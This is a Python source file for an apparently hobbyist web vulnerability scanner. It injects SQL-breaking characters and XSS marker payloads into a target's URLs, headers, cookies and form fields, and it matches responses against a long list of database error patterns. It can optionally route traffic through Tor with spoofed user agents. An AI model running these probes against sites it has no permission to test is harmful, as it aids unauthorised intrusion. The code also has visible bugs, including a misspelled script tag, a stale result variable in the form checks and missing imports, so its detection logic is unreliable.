from TheSilent.clear import *
from TheSilent.form_scanner import *
from TheSilent.link_scanner import *
from TheSilent.return_user_agent import *

import hashlib
import requests

cyan = "\033[1;36m"
red = "\033[1;31m"

#create html sessions object
web_session = requests.Session()

tor_proxy = {"https": "socks5h://localhost:9050", "http": "socks5h://localhost:9050"}

#fake user agent
user_agent = {"User-Agent" : return_user_agent()}

#increased security
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

#increased security
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ":HIGH:!DH:!aNULL"

except AttributeError:
    pass

#returns malicious xss payloads
def return_mal_payloads():
    #malicious script
    mal_payloads = []

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append('<scipt>alert("' + str(md5) + '")</script>')

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append("toString(" + str(md5) + ")")

    my_random = random.randint(0, 1000000000)
    md5_1 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    md5_2 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append(str(md5_1) + "=" + str(md5_2))

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append("getElementById(" + str(md5) + ")")

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append("innerHTML=" + str(md5))

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append("src=" + str(md5))

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append("console.log(" + str(md5) + ")")

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append("document.write(" + str(md5) + ")")

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append("appendChild(" + str(md5) + ")")

    my_random = random.randint(0, 1000000000)
    md5 = hashlib.md5(str(my_random).encode("utf8")).hexdigest()
    mal_payloads.append("document.createTextNode(" + str(md5) + ")")

    return mal_payloads

#scans for sql injection errors
def sql_injection_scanner(url, secure = True):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    #sql errors
    error_message = {"SQL syntax.*?MySQL", "Warning.*?\Wmysqli?_", "MySQLSyntaxErrorException", "valid MySQL result", "check the manual that (corresponds to|fits) your MySQL server version", "check the manual that (corresponds to|fits) your MariaDB server version", "check the manual that (corresponds to|fits) your Drizzle server version", "Unknown column '[^ ]+' in 'field list'", "MySqlClient\.", "com\.mysql\.jdbc", "Zend_Db_(Adapter|Statement)_Mysqli_Exception", "Pdo\[./_\\]Mysql", "MySqlException", "SQLSTATE\[\d+\]: Syntax error or access violation", "MemSQL does not support this type of query", "is not supported by MemSQL", "unsupported nested scalar subselect", "PostgreSQL.*?ERROR", "Warning.*?\Wpg_", "valid PostgreSQL result", "Npgsql\.", "PG::SyntaxError:", "org\.postgresql\.util\.PSQLException", "ERROR:\s\ssyntax error at or near", "ERROR: parser: parse error at or near", "PostgreSQL query failed", "org\.postgresql\.jdbc", "Pdo\[./_\\]Pgsql", "PSQLException", "OLE DB.*? SQL Server", "\bSQL Server[^&lt;&quot;]+Driver", "Warning.*?\W(mssql|sqlsrv)_", "\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}", "System\.Data\.SqlClient\.(SqlException|SqlConnection\.OnError)", "(?s)Exception.*?\bRoadhouse\.Cms\.", "Microsoft SQL Native Client error '[0-9a-fA-F]{8}", "\[SQL Server\]", "ODBC SQL Server Driver", "ODBC Driver \d+ for SQL Server", "SQLServer JDBC Driver", "com\.jnetdirect\.jsql", "macromedia\.jdbc\.sqlserver", "Zend_Db_(Adapter|Statement)_Sqlsrv_Exception", "com\.microsoft\.sqlserver\.jdbc", "Pdo\[./_\\](Mssql|SqlSrv)", "SQL(Srv|Server)Exception", "Unclosed quotation mark after the character string", "Microsoft Access (\d+ )?Driver", "JET Database Engine", "Access Database Engine", "ODBC Microsoft Access", "Syntax error \(missing operator\) in query expression", "\bORA-\d{5}", "Oracle error", "Oracle.*?Driver", "Warning.*?\W(oci|ora)_", "quoted string not properly terminated", "SQL command not properly ended", "macromedia\.jdbc\.oracle", "oracle\.jdbc", "Zend_Db_(Adapter|Statement)_Oracle_Exception", "Pdo\[./_\\](Oracle|OCI)", "OracleException", "CLI Driver.*?DB2", "DB2 SQL error", "\bdb2_\w+\(", "SQLCODE[=:\d, -]+SQLSTATE", "com\.ibm\.db2\.jcc", "Zend_Db_(Adapter|Statement)_Db2_Exception", "Pdo\[./_\\]Ibm", "DB2Exception", "ibm_db_dbi\.ProgrammingError", "Warning.*?\Wifx_", "Exception.*?Informix", "Informix ODBC Driver", "ODBC Informix driver", "com\.informix\.jdbc", "weblogic\.jdbc\.informix", "Pdo\[./_\\]Informix", "IfxException", "Dynamic SQL Error", "Warning.*?\Wibase_", "org\.firebirdsql\.jdbc", "Pdo\[./_\\]Firebird", "SQLite/JDBCDriver", "SQLite\.Exception", "(Microsoft|System)\.Data\.SQLite\.SQLiteException", "Warning.*?\W(sqlite_|SQLite3::)", "\[SQLITE_ERROR\]", "SQLite error \d+:", "sqlite3.OperationalError:", "SQLite3::SQLException", "org\.sqlite\.JDBC", "Pdo\[./_\\]Sqlite", "SQLiteException", "SQL error.*?POS([0-9]+)", "Warning.*?\Wmaxdb_", "DriverSapDB", "-3014.*?Invalid end of SQL statement", "com\.sap\.dbtech\.jdbc", "\[-3008\].*?: Invalid keyword or missing delimiter", "Warning.*?\Wsybase_", "Sybase message", "Sybase.*?Server message", "SybSQLException", "Sybase\.Data\.AseClient", "com\.sybase\.jdbc", "Warning.*?\Wingres_", "Ingres SQLSTATE", "Ingres\W.*?Driver", "com\.ingres\.gcf\.jdbc", "Exception (condition )?\d+\. Transaction rollback", "com\.frontbase\.jdbc", "Syntax error 1. Missing", "(Semantic|Syntax) error [1-4]\d{2}\.", "Unexpected end of command in statement \[", "Unexpected token.*?in statement \[", "org\.hsqldb\.jdbc", "org\.h2\.jdbc", "\[42000-192\]", "![0-9]{5}![^\n]+(failed|unexpected|error|syntax|expected|violation|exception)", "\[MonetDB\]\[ODBC Driver", "nl\.cwi\.monetdb\.jdbc", "Syntax error: Encountecyan", "org\.apache\.derby", "ERROR 42X01", ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):", "/vertica/Parser/scan", "com\.vertica\.jdbc", "org\.jkiss\.dbeaver\.ext\.vertica", "com\.vertica\.dsi\.dataengine", "com\.mckoi\.JDBCDriver", "com\.mckoi\.database\.jdbc", "&lt;REGEX_LITERAL&gt;", "com\.facebook\.presto\.jdbc", "io\.prestosql\.jdbc", "com\.simba\.presto\.jdbc", "UNION query has different number of fields: \d+, \d+", "Altibase\.jdbc\.driver", "com\.mimer\.jdbc", "Syntax error,[^\n]+assumed to mean", "io\.crate\.client\.jdbc", "encountecyan after end of query", "A comparison operator is requicyan here", "-10048: Syntax error", "rdmStmtPrepare\(.+?\) returned", "SQ074: Line \d+:", "SR185: Undefined procedure", "SQ200: No table ", "Virtuoso S0002 Error", "\[(Virtuoso Driver|Virtuoso iODBC Driver)\]\[Virtuoso Server\]"}
    
    #malicious sql code
    mal_sql = ["\"", "\'", ";", "*"]

    my_list = []

    clear()

    my_result = []

    if url.endswith("/"):
        my_result.append(my_secure + url)

    if not url.endswith("/"):
        my_result.append(my_secure + url + "/")

    clear()

    for j in my_result:
        for c in mal_sql:
            new_url = j + c
            print(cyan + "checking: " + str(new_url))
            
            try:
                result = web_session.get(new_url, verify = False, headers = user_agent, timeout = (5, 30))

                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(red + "firewall detected")

                else:
                    result = web_session.get(new_url, verify = False, headers = user_agent, timeout = (5, 30)).text
                    
                    for i in error_message:
                        my_regex = re.search(i, result)

                        try:
                            if my_regex:
                                print(cyan + "true: " + str(i) + " " + str(my_regex.span()) + " " + new_url)
                                my_list.append(str(i) + " " + str(my_regex.span()) + " " + new_url)
                                break

                        except UnicodeDecodeError:
                            break

            except:
                pass

            print(cyan + "checking headers: " + str(j) + " (" + c + ")")

            user_agent_moded = {"User-Agent" : return_user_agent(), c : c}

            try:
                result = web_session.get(j, verify = False, headers = user_agent_moded, timeout = (5, 30))

                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(red + "firewall detected")

                else:
                    result = web_session.get(j, verify = False, headers = user_agent_moded, timeout = (5, 30)).text

                    for i in error_message:
                        my_regex = re.search(i, result)

                        try:
                            if my_regex:
                                print(cyan + "true headers: " + str(i) + " " + str(my_regex.span()) + " " + j + " (" + c + ")")
                                my_list.append("headers: " + str(i) + " " + str(my_regex.span()) + " " + j + " (" + c + ")")
                                break

                        except UnicodeDecodeError:
                            break

            except:
                pass

            print(cyan + "checking cookies: " + str(j) + " (" + c + ")")

            mal_cookie = {c : c}

            try:
                result = web_session.get(j, verify = False, headers = user_agent, cookies = mal_cookie, timeout = (5, 30))

                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(red + "firewall detected")

                else:
                    result = web_session.get(j, verify = False, headers = user_agent, cookies = mal_cookie, timeout = (5, 30)).text

                    for i in error_message:
                        my_regex = re.search(i, result)

                        try:
                            if my_regex:
                                print(cyan + "true cookies: " + str(i) + " " + str(my_regex.span()) + " " + j + " (" + c + ")")
                                my_list.append("cookies: " + str(i) + " " + str(my_regex.span()) + " " + j + " (" + c + ")")
                                break

                        except UnicodeDecodeError:
                            break

            except:
                pass

        try:
            print("checking for forms on: " + j)
            clean = j.replace("http://", "")
            clean = clean.replace("https://", "")
            form_input = form_scanner(clean, secure, parse = "input")

            for i in form_input:
                for ii in mal_sql:
                    name = str(re.findall("name.+\".+\"", i)).split("\"")
                    mal_dict = {name[1] : ii}

                    print(cyan + "checking: " + str(j) + " " + str(mal_dict))

                    
                    get = web_session.get(j, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30))
                    post = web_session.post(j, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30))

                    if get.status_code == 401 or get.status_code == 403 or get.status_code == 405 or post.status_code == 401 or post.status_code == 403 or post.status_code == 405:
                        print(red + "firewall detected")

                    else:
                        get = web_session.get(j, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).text
                        post = web_session.post(j, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30)).text

                        try:
                            for iii in error_message:
                                get_regex = re.search(iii, result)

                                if get_regex:
                                    print(cyan + "true: " + str(mal_dict) + " " + str(my_regex.span()) + " " + str(j))
                                    my_list.append(str(mal_dict) + " " + str(my_regex.span()) + " " + str(j))
                                    break

                                post_regex = re.search(iii, result)

                                if post_regex:
                                    print(cyan + "true: " + str(mal_dict) + " " + str(my_regex.span()) + " " + str(j))
                                    my_list.append(str(mal_dict) + " " + str(my_regex.span()) + " " + str(j))
                                    break

                        except UnicodeDecodeError:
                            break

        except:
            pass



    my_list = list(dict.fromkeys(my_list))

    clear()
    
    return my_list

#scans for vulnerabilties with depth=0
def vuln_scanner(url, secure = True, tor = False):
    my_sql_injection_scanner = sql_injection_scanner(url, secure)
    my_xss_scanner = xss_scanner(url, secure, tor)
    
    print("SQL")

    for i in my_sql_injection_scanner:
        print(i)

    print("")
    print("XSS")

    for i in my_xss_scanner:
        print(i)

#scans for xss vulnerabilites
def xss_scanner(url, secure = True, tor = False):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"
        
    my_list = []
    
    clear()

    my_result = []

    if url.endswith("/"):
        my_result.append(my_secure + url)

    if not url.endswith("/"):
        my_result.append(my_secure + url + "/")

    for links in my_result:
        mal_payloads = return_mal_payloads()
        
        try:
            for mal_script in mal_payloads:
                if links.endswith("/"):
                    my_url = links + mal_script

                if not links.endswith("/"):
                    my_url = links + "/" + mal_script

                print(cyan + "checking: " + str(my_url)) 

                if tor == True:
                    result = web_session.get(my_url, verify = False, headers = user_agent, proxies = tor_proxy, timeout = (5, 30))
                    
                if tor == False:
                    result = web_session.get(my_url, verify = False, headers = user_agent, timeout = (5, 30))

                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(red + "firewall detected")

                if result.status_code >= 200 and result.status_code < 300:
                    if mal_script in result.text and "404" not in result.text:
                        print(cyan + "true: " + my_url)
                        my_list.append(my_url)

        except:
            continue
        
        print(cyan + "checking: " + str(links) + " (user agent)")  

        try:
            for mal_script in mal_payloads:
                user_agent_moded = {"User-Agent" : return_user_agent(), mal_script: mal_script}

                if tor == True:
                    result = web_session.get(links, verify = False, headers = user_agent_moded, proxies = tor_proxy, timeout = (5, 30))

                if tor == False:
                    result = web_session.get(links, verify = False, headers = user_agent_moded, timeout = (5, 30))
                
                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(red + "firewall detected")

                if result.status_code >= 200 and result.status_code < 300:
                    if mal_script in result.text and "404" not in result.text:
                        print(cyan + "true: " + links + " (user agent) " + mal_script)
                        my_list.append(links + " (user agent) " + mal_script)

        except:
            continue

        

        print(cyan + "checking: " + str(links) + " (cookie)")  

        try:
            for mal_script in mal_payloads:
                mal_cookie = {mal_script: mal_script}

                if tor == True:
                    result = web_session.get(links, verify = False, headers = user_agent, cookies = mal_cookie, proxies = tor_proxy, timeout = (5, 30))

                if tor == False:
                    result = web_session.get(links, verify = False, headers = user_agent, cookies = mal_cookie, timeout = (5, 30))
                
                if result.status_code == 401 or result.status_code == 403 or result.status_code == 405:
                    print(red + "firewall detected")

                if result.status_code >= 200 and result.status_code < 300:
                    if mal_script in result.text and "404" not in result.text:
                        print(cyan + "true: " + links + " (cookie) " + mal_script)
                        my_list.append(links + " (cookie) " + mal_script)

        except:
            continue

        try:
            print(cyan + "checking for forms on: " + links)
            clean = links.replace("http://", "")
            clean = clean.replace("https://", "")
            form_input = form_scanner(clean, secure, parse = "input")

            for i in form_input:
                for mal_script in mal_payloads:
                    name = str(re.findall("name.+\".+\"", i)).split("\"")
                    mal_dict = {name[1] : mal_script}

                    print(cyan + "checking: " + str(links) + " " + str(mal_dict))

                    if tor == True:
                        get = web_session.get(links, params = mal_dict, verify = False, headers = user_agent, proxies = tor_proxy, timeout = (5, 30))
                        post = web_session.post(links, data = mal_dict, verify = False, headers = user_agent, proxies = tor_proxy, timeout = (5, 30))

                    if tor == False:
                        get = web_session.get(links, params = mal_dict, verify = False, headers = user_agent, timeout = (5, 30))
                        post = web_session.post(links, data = mal_dict, verify = False, headers = user_agent, timeout = (5, 30))

                    if get.status_code == 401 or get.status_code == 403 or get.status_code == 405:
                        print(red + "firewall detected")

                    if get.status_code >= 200 and get.status_code < 300:
                        if mal_script in get.text and "404" not in get.text:
                            print(cyan + "true: " + str(links) + " " + str(mal_dict))
                            my_list.append(str(links) + " " + str(mal_dict))

                    if post.status_code == 401 or post.status_code == 403 or post.status_code == 405:
                        print(red + "firewall detected")

                    if post.status_code >= 200 and post.status_code < 300:
                        if mal_script in post.text and "404" not in post.text:
                            print(cyan + "true: " + str(links) + " " + str(mal_dict))
                            my_list.append(str(links) + " " + str(mal_dict))

        except:
            continue

    clear()

    my_list = list(dict.fromkeys(my_list))
    my_list.sort()

    return my_list
